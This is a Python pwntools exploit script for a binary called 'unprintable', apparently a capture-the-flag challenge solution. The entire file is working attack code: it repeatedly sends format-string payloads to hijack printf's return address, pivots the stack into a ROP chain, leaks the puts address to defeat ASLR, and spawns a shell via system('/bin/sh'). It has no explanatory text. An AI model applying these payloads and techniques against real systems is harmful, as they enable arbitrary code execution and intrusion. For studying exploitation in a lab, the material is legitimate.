#coding=utf-8
from pwn import *

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF("./unprintable")
context.terminal=["tmux","splitw","-h"]
def debug():
    gdb.attach(a,'''
    b *(0x0000000004007C1)
    b *0x000000000601160
    ''')
def fsb(payload):
    sleep(0.5)
    a.send(payload)
flag=False
pop_rbp_ret=0x0000000000400690
pop_rsp_pop3_ret=0x000000000040082d#pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
add_ret=0x0000000004006E8 # adc     [rbp+48h], edx
#target=0x60101f
stdout=0x000000000601020
pop_rbx_pop5_ret=0x00000000040082A
pop_rdi_ret=0x0000000000400833
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
while 1:
        if flag == True:
            break

        a=process("./unprintable")
        fini_addr=0x600dd8
        a.recvuntil("This is your gift: ")
        stack_addr=eval(a.recv(14))
        if stack_addr&0xffff < 0x2000:
        
            success("stack_addr ==> 0x%x"%stack_addr)
            sec_printf_ret=stack_addr-0x120
            success("printf_ret ==> 0x%x"%sec_printf_ret)

            payload="%748c%26$n"# 修改指针
            payload+='%'+str((sec_printf_ret&0xffff)-748)+'c'+"%11$hn"
            payload=payload.ljust(100,'\x00')
            payload+=p64(0x0000000004007A3)       
            a.recvuntil("\n")
            a.send(payload.ljust(0x1000,'\x00'))
            ret_addr=0x4007A3&0xffff

            if ((sec_printf_ret+8)&0xffff)-0x7a3 < 0 :
                flag=False
                continue
            
            payload='%'+str(ret_addr)+'c'+"%72$hn"+'\x00' # 修改printf的返回地址
            a.send(payload.ljust(0x1000,'\x00')) 
            payload='%'+str(ret_addr)+'c'+"%72$hn"
            payload+="%"+str(((sec_printf_ret+8)&0xffff)-0x7a3)+"c"+"%60$hn"
            a.send(payload.ljust(0x1000,'\x00'))

            payload='%'+str(ret_addr)+'c'+"%72$hn"
            payload+='%'+str((0x000000000601160&0xffff)-0x7a3)+'c'+"%74$hn"
            a.send(payload.ljust(0x1000,'\x00'))

            payload='%'+str(ret_addr)+'c'+"%72$hn"
            payload+="%"+str(((sec_printf_ret+8+2)&0xffff)-0x7a3)+"c"+"%60$hn"
            a.send(payload.ljust(0x1000,'\x00'))  

            payload='%'+str(((0x000000000601160>>16)&0xffff))+'c'+"%74$hn"
            payload+='%'+str(ret_addr-((0x000000000601160>>16)&0xffff))+'c'+"%72$hn"
            a.send(payload.ljust(0x1000,'\x00'))

            payload='%'+str(ret_addr)+'c'+"%72$hn"
            payload+="%"+str(((sec_printf_ret+8+4)&0xffff)-0x7a3)+"c"+"%60$hn"
            a.send(payload.ljust(0x1000,'\x00'))  
    
            payload="%74$hn"
            payload+='%'+str(ret_addr)+'c'+"%72$hn"
            a.send(payload.ljust(0x1000,'\x00'))
            #debug()
            
            target_addr=stack_addr-0x68
            payload='%'+str(ret_addr)+'c'+"%72$hn"
            payload+="%"+str((target_addr&0xffff)-0x7a3)+"c"+"%60$hn"
            a.send(payload.ljust(0x1000,'\x00'))


            payload="%"+str(0x690)+"c%74$hn"
            payload+='%'+str(ret_addr-0x690)+'c'+"%72$hn"
            a.send(payload.ljust(0x1000,'\x00')) # 这步需要set下
            #debug()
            payload="%2c%28$hn"
            payload+='%'+str(ret_addr-2)+'c'+"%72$hn"
            a.send(payload.ljust(0x1000,'\x00'))  # 将fileno = 2

            payload='%'+str(pop_rsp_pop3_ret&0xffff)+'c'+"%72$hn"
            payload=payload.ljust(0x100,'\x00')
            rop=p64(1)*3#temp
            rop+=p64(pop_rdi_ret)
            rop+=p64(puts_got)
            rop+=p64(puts_plt)
            rop+=p64(0x00000000040082A)#foot
            rop+=p64(0)
            rop+=p64(1)
            rop+=p64(elf.got["read"])
            rop+=p64(0x3000)
            rop+=p64(0x000000000601160+14*8+56)
            rop+=p64(0)
            rop+=p64(0x000000000400810)
            rop+='A'*56
            payload+=rop
            a.send(payload.ljust(0x1000,'\x00'))
            puts_addr=u64(a.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
            success("puts_addr ==> 0x%x"%puts_addr)
            libc_base=puts_addr-libc.symbols["puts"]
            system_addr=libc_base+libc.symbols["system"]
            bin_sh_addr=libc_base+next(libc.search("/bin/sh"))
            pop5_ret=0x000000000040082b
            rop2=(p64(pop5_ret)+p64(0)*5)*100
            rop2+=p64(pop_rdi_ret)
            rop2+=p64(bin_sh_addr)
            rop2+=p64(system_addr)
            #rop2+=p64(pop_rdi_ret)
            #rop2+=p64(bin_sh_addr)
            #rop2+=p64(system_addr)
            a.send(rop2.ljust(0x3000,'\x00'))
            flag=True
            a.interactive()
        else:
            a.close()
            continue
